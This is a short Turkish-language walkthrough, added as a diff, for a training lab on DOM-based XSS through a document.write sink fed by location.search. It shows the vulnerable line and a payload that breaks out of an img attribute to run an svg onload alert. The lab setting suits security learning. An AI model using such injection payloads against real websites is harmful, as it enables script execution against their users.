@@ -1,0 +1,9 @@
+LAB: DOM XSS in document.write sink using source location.search
+
+1 - Herhangi bir sayı girerek aratın.
+
+2 - Sayfa kaynağını inceleyin. 
+document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">')
+
+3 - img başlığından kaçınmak için aşağıdaki payloadı yazın.
+1 "><svg onload=alert(1)>
